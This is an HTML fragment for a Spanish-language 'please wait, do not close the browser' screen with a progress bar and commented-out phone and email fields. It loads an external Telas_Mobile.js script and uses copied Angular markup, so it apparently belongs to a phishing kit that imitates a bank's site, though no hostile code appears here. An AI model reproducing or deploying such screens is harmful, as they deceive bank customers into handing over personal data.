<script src="Telas_Mobile.js"></script>

<style>
    
    progress{
        background-color: rgb(242, 243, 244);border: 0;height: 15px;border-radius: 1px;display: block;-webkit-appearance: none;width: 100%;;
    }
    progress::-webkit-progress-bar{
        background: rgb(242, 243, 244);border-radius: 1px;padding: 2px;
    }
    progress::-webkit-progress-value{
        border-radius: 1px;background: #e60000;
    }
    ::-moz-progress-bar {
        background-color: #e60000;
    }
    :indeterminate::-moz-progress-bar {
        width: 0;
    }
</style>

<form id="frmData" style="" name="frmData" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
    <div _ngcontent-c23="" class="row top-margin">
        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
            <div _ngcontent-c23="" class="form-group">
                <progress id="Barr2min" value="0" max="100"></progress>
                <p style="margin-top: 1rem;text-align: center;">
                    <span style="font-size:14px;" id="avisopreventivo">Este proceso puede tardar unos minutos, <b>NO CIERRE EL NAVEGADOR</b>, gracias.</span>
                </p>
            </div>
        </div>
        <!--<div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
            <div _ngcontent-c23="" class="form-group">
                <label _ngcontent-c23="" class="texto">N&uacute;mero de Casa u Oficina</label>
                <input id="phone" name="phone" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" maxlength="10" placeholder="Teléfono de Casa u Oficina" type="text" onKeyPress="return soloNumeros(event)">
            </div>
        </div>
        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
            <div _ngcontent-c23="" class="form-group">
                <label _ngcontent-c23="" class="texto">
                    Correo electr&oacute;nico
                </label>
                <input id="email" name="email" _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="" placeholder="Correo electrónico" type="text">
            </div>
        </div>-->
    </div>
    <span _ngcontent-c23=""></span>



    <!--<div _ngcontent-c23="" class="row justify-content-center my-4">
        <button id="btnEmail" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
            Continuar
        </button>
    </div>-->
</form>
